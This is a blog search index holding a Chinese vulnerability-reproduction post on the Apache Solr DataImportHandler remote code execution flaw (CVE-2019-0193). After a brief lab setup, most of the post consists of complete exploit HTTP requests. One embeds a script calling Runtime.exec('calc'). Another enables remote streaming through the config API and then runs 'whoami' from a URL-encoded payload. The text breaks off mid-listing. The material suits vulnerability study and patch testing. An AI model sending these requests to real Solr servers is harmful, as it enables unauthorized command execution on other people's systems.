<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>APACHE SOLR远程代码执行漏洞(CVE-2019-0193)</title>
      <link href="/2021/02/15/apache-solr-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2019-0193/"/>
      <url>/2021/02/15/apache-solr-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2019-0193/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>APACHE SOLR下载链接：<a href="http://archive.apache.org/dist/lucene/solr/" target="_blank" rel="noopener">传送门</a></p><p>Windows端启动APACHE SOLR 8.1.1的服务（192.168.0.104:8983），启动命令为：solr.cmd -e dih</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>获取Solr中所有索引库(core)的名称</p><figure class="highlight crystal"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="symbol">http:</span>/<span class="regexp">/192.168.0.104:8983/solr</span><span class="regexp">/admin/cores</span>  &gt; <span class="keyword">out</span>.txt</span><br></pre></td></tr></tbody></table></figure><p>检测是否启用DataImportHandler模块</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.104</span>:<span class="number">8983</span><span class="regexp">/solr/</span>atom<span class="regexp">/admin/m</span>beans?cat=QUERY&amp;wt=json</span><br><span class="line">或</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.104</span>:<span class="number">8983</span><span class="regexp">/solr/</span><span class="comment">#/atom/dataimport</span></span><br><span class="line">如果http响应为sorry, no dataimport-handler defined!则该模块未启用</span><br></pre></td></tr></tbody></table></figure><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h3><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/{atom}/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: solr.com:8983</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://solr.com:8983/solr/</span><br><span class="line"><span class="attribute">Content-type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 1231</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core={atom}&amp;name=dataimport&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">          function poc(row){</span><br><span class="line"></span><br><span class="line"> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("calc").getInputStream()));</span><br><span class="line"></span><br><span class="line">var result = [];</span><br><span class="line"></span><br><span class="line">while(true) {</span><br><span class="line">var oneline = bufReader.readLine();</span><br><span class="line">result.push( oneline );</span><br><span class="line">if(!oneline) break;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="attribute">row.put("title",result.join("\n\r"));</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">return row;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">        &lt;document&gt;</span><br><span class="line">             &lt;entity name="entity1"</span><br><span class="line">                     url="https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml"</span><br><span class="line">                     processor="XPathEntityProcessor"</span><br><span class="line">                     forEach="/RDF/item"</span><br><span class="line">                     transformer="script:poc"&gt;</span><br><span class="line">                        &lt;field column="title" xpath="/RDF/item/title" /&gt;</span><br><span class="line">             &lt;/entity&gt;</span><br><span class="line">        &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></tbody></table></figure><p>版本&lt;=8.1.1,计算机弹出成功</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://image.iwonder.run/imgs/2021/02/05e6499ba76f3e68.png" alt="计算机弹出成功"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2021/02/2694af28aa14c4c2.png" alt="计算机弹出成功"><br>版本&gt;=8.2.0,计算机弹出失败</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://image.iwonder.run/imgs/2021/02/ea0569ce2ccbf18b.png" alt="计算器弹出失败"></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h3><p>修改configoverlay.json文件中的配置 以启用远程流的相关选项 .enableStreamBody .enableRemoteStreaming</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/atom/<span class="built_in">config</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.104</span></span><br><span class="line">Accept: */*</span><br><span class="line">Content-<span class="built_in">type</span>:application/json</span><br><span class="line">Content-Length: <span class="number">159</span></span><br><span class="line">Connection: <span class="built_in">close</span></span><br><span class="line"></span><br><span class="line">{<span class="string">"set-property"</span>: {<span class="string">"requestDispatcher.requestParsers.enableRemoteStreaming"</span>: <span class="literal">true</span>}, <span class="string">"set-property"</span>: {<span class="string">"requestDispatcher.requestParsers.enableStreamBody"</span>: <span class="literal">true</span>}}</span><br></pre></td></tr></tbody></table></figure><p>发送请求 执行系统命令ifconfig 并得到回显 </p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/tika/dataimport?command=full-import&amp;verbose=<span class="keyword">false</span>&amp;clean=<span class="keyword">false</span>&amp;commit=<span class="keyword">false</span>&amp;debug=<span class="keyword">true</span>&amp;core=tika&amp;name=dataimport&amp;dataConfig=<span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%64</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%61</span><span class="symbol">%43</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%66</span><span class="symbol">%69</span><span class="symbol">%67</span><span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%64</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%61</span><span class="symbol">%53</span><span class="symbol">%6</span>f<span class="symbol">%75</span><span class="symbol">%72</span><span class="symbol">%63</span><span class="symbol">%65</span><span class="symbol">%20</span><span class="symbol">%6</span>e<span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%73</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%73</span><span class="symbol">%72</span><span class="symbol">%63</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%74</span><span class="symbol">%79</span><span class="symbol">%70</span><span class="symbol">%65</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%43</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%53</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%44</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%61</span><span class="symbol">%53</span><span class="symbol">%6</span>f<span class="symbol">%75</span><span class="symbol">%72</span><span class="symbol">%63</span><span class="symbol">%65</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%6</span>f<span class="symbol">%67</span><span class="symbol">%67</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%4</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%76</span><span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%54</span><span class="symbol">%52</span><span class="symbol">%41</span><span class="symbol">%43</span><span class="symbol">%45</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%2</span>f<span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%73</span><span class="symbol">%63</span><span class="symbol">%72</span><span class="symbol">%69</span><span class="symbol">%70</span><span class="symbol">%74</span><span class="symbol">%3</span>e<span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%21</span><span class="symbol">%5</span>b<span class="symbol">%43</span><span class="symbol">%44</span><span class="symbol">%41</span><span class="symbol">%54</span><span class="symbol">%41</span><span class="symbol">%5</span>b<span class="symbol">%20</span><span class="symbol">%66</span><span class="symbol">%75</span><span class="symbol">%6</span>e<span class="symbol">%63</span><span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%20</span><span class="symbol">%70</span><span class="symbol">%6</span>f<span class="symbol">%63</span><span class="symbol">%28</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%77</span><span class="symbol">%29</span><span class="symbol">%7</span>b<span class="symbol">%20</span><span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%72</span><span class="symbol">%20</span><span class="symbol">%62</span><span class="symbol">%75</span><span class="symbol">%66</span><span class="symbol">%52</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%20</span><span class="symbol">%3</span>d<span class="symbol">%20</span><span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%77</span><span class="symbol">%20</span><span class="symbol">%6</span>a<span class="symbol">%61</span><span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%2</span>e<span class="symbol">%69</span><span class="symbol">%6</span>f<span class="symbol">%2</span>e<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%66</span><span class="symbol">%66</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%64</span><span class="symbol">%52</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%28</span><span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%77</span><span class="symbol">%20</span><span class="symbol">%6</span>a<span class="symbol">%61</span><span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%2</span>e<span class="symbol">%69</span><span class="symbol">%6</span>f<span class="symbol">%2</span>e<span class="symbol">%49</span><span class="symbol">%6</span>e<span class="symbol">%70</span><span class="symbol">%75</span><span class="symbol">%74</span><span class="symbol">%53</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%52</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%28</span><span class="symbol">%6</span>a<span class="symbol">%61</span><span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%2</span>e<span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%61</span><span class="symbol">%6</span>e<span class="symbol">%67</span><span class="symbol">%2</span>e<span class="symbol">%52</span><span class="symbol">%75</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%2</span>e<span class="symbol">%67</span><span class="symbol">%65</span><span class="symbol">%74</span><span class="symbol">%52</span><span class="symbol">%75</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%2</span>e<span class="symbol">%65</span><span class="symbol">%78</span><span class="symbol">%65</span><span class="symbol">%63</span><span class="symbol">%28</span><span class="symbol">%22</span><span class="symbol">%77</span><span class="symbol">%68</span><span class="symbol">%6</span>f<span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%69</span><span class="symbol">%22</span><span class="symbol">%29</span><span class="symbol">%2</span>e<span class="symbol">%67</span><span class="symbol">%65</span><span class="symbol">%74</span><span class="symbol">%49</span><span class="symbol">%6</span>e<span class="symbol">%70</span><span class="symbol">%75</span><span class="symbol">%74</span><span class="symbol">%53</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%72</span><span class="symbol">%20</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%73</span><span class="symbol">%75</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%74</span><span class="symbol">%20</span><span class="symbol">%3</span>d<span class="symbol">%20</span><span class="symbol">%5</span>b<span class="symbol">%5</span>d<span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%77</span><span class="symbol">%68</span><span class="symbol">%69</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%28</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%75</span><span class="symbol">%65</span><span class="symbol">%29</span><span class="symbol">%20</span><span class="symbol">%7</span>b<span class="symbol">%20</span><span class="symbol">%76</span><span class="symbol">%61</span><span class="symbol">%72</span><span class="symbol">%20</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%20</span><span class="symbol">%3</span>d<span class="symbol">%20</span><span class="symbol">%62</span><span class="symbol">%75</span><span class="symbol">%66</span><span class="symbol">%52</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%64</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%2</span>e<span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%64</span><span class="symbol">%4</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%73</span><span class="symbol">%75</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%74</span><span class="symbol">%2</span>e<span class="symbol">%70</span><span class="symbol">%75</span><span class="symbol">%73</span><span class="symbol">%68</span><span class="symbol">%28</span><span class="symbol">%20</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%20</span><span class="symbol">%29</span><span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%69</span><span class="symbol">%66</span><span class="symbol">%28</span><span class="symbol">%21</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%65</span><span class="symbol">%29</span><span class="symbol">%20</span><span class="symbol">%62</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>b<span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%7</span>d<span class="symbol">%20</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%77</span><span class="symbol">%2</span>e<span class="symbol">%70</span><span class="symbol">%75</span><span class="symbol">%74</span><span class="symbol">%28</span><span class="symbol">%22</span><span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%22</span><span class="symbol">%2</span><span class="keyword">c</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%73</span><span class="symbol">%75</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%74</span><span class="symbol">%2</span>e<span class="symbol">%6</span>a<span class="symbol">%6</span>f<span class="symbol">%69</span><span class="symbol">%6</span>e<span class="symbol">%28</span><span class="symbol">%22</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%6</span>e<span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%72</span><span class="symbol">%22</span><span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%74</span><span class="symbol">%75</span><span class="symbol">%72</span><span class="symbol">%6</span>e<span class="symbol">%20</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%77</span><span class="symbol">%3</span>b<span class="symbol">%20</span><span class="symbol">%7</span>d<span class="symbol">%20</span><span class="symbol">%5</span>d<span class="symbol">%5</span>d<span class="symbol">%3</span>e<span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%2</span>f<span class="symbol">%73</span><span class="symbol">%63</span><span class="symbol">%72</span><span class="symbol">%69</span><span class="symbol">%70</span><span class="symbol">%74</span><span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%64</span><span class="symbol">%6</span>f<span class="symbol">%63</span><span class="symbol">%75</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%79</span><span class="symbol">%20</span><span class="symbol">%73</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%75</span><span class="symbol">%65</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%6</span>e<span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%79</span><span class="symbol">%31</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%64</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%61</span><span class="symbol">%73</span><span class="symbol">%6</span>f<span class="symbol">%75</span><span class="symbol">%72</span><span class="symbol">%63</span><span class="symbol">%65</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%73</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%65</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%73</span><span class="symbol">%72</span><span class="symbol">%63</span><span class="symbol">%31</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%70</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%63</span><span class="symbol">%65</span><span class="symbol">%73</span><span class="symbol">%73</span><span class="symbol">%6</span>f<span class="symbol">%72</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%58</span><span class="symbol">%50</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%68</span><span class="symbol">%45</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%79</span><span class="symbol">%50</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%63</span><span class="symbol">%65</span><span class="symbol">%73</span><span class="symbol">%73</span><span class="symbol">%6</span>f<span class="symbol">%72</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%6</span>f<span class="symbol">%74</span><span class="symbol">%45</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%79</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%75</span><span class="symbol">%65</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%66</span><span class="symbol">%6</span>f<span class="symbol">%72</span><span class="symbol">%45</span><span class="symbol">%61</span><span class="symbol">%63</span><span class="symbol">%68</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%2</span>f<span class="symbol">%52</span><span class="symbol">%44</span><span class="symbol">%46</span><span class="symbol">%2</span>f<span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%65</span><span class="symbol">%6</span>d<span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%74</span><span class="symbol">%72</span><span class="symbol">%61</span><span class="symbol">%6</span>e<span class="symbol">%73</span><span class="symbol">%66</span><span class="symbol">%6</span>f<span class="symbol">%72</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%73</span><span class="symbol">%63</span><span class="symbol">%72</span><span class="symbol">%69</span><span class="symbol">%70</span><span class="symbol">%74</span><span class="symbol">%3</span>a<span class="symbol">%70</span><span class="symbol">%6</span>f<span class="symbol">%63</span><span class="symbol">%22</span><span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%66</span><span class="symbol">%69</span><span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%64</span><span class="symbol">%20</span><span class="symbol">%63</span><span class="symbol">%6</span>f<span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%75</span><span class="symbol">%6</span>d<span class="symbol">%6</span>e<span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%78</span><span class="symbol">%70</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%68</span><span class="symbol">%3</span>d<span class="symbol">%22</span><span class="symbol">%2</span>f<span class="symbol">%52</span><span class="symbol">%44</span><span class="symbol">%46</span><span class="symbol">%2</span>f<span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%65</span><span class="symbol">%6</span>d<span class="symbol">%2</span>f<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%2</span>f<span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%2</span>f<span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%79</span><span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%2</span>f<span class="symbol">%64</span><span class="symbol">%6</span>f<span class="symbol">%63</span><span class="symbol">%75</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%3</span>e<span class="symbol">%20</span><span class="symbol">%3</span><span class="keyword">c</span><span class="symbol">%2</span>f<span class="symbol">%64</span><span class="symbol">%61</span><span class="symbol">%74</span><span class="symbol">%61</span><span class="symbol">%43</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%66</span><span class="symbol">%69</span><span class="symbol">%67</span><span class="symbol">%3</span>e HTTP/<span class="number">1.1</span></span><br><span class="line">Host: solr.com:<span class="number">8983</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh<span class="comment">; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span></span><br><span class="line"><span class="comment">Accept: application/json, text/plain, */*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Referer: http://solr.com:8983/solr/</span></span><br><span class="line"><span class="comment">Content-Length: 212</span></span><br><span class="line"><span class="comment">content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------aceb88c2159f183f</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="stream.body"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;RDF&gt;</span></span><br><span class="line"><span class="comment">&lt;item/&gt;</span></span><br><span class="line"><span class="comment">&lt;/RDF&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------aceb88c2159f183f--</span></span><br></pre></td></tr></tbody></table></figure><p>其中dataConfig的值为：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">name</span>=<span class="string">"streamsrc"</span> <span class="attr">type</span>=<span class="string">"ContentStreamDataSource"</span> <span class="attr">loggerLevel</span>=<span class="string">"TRACE"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="actionscript">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span><span 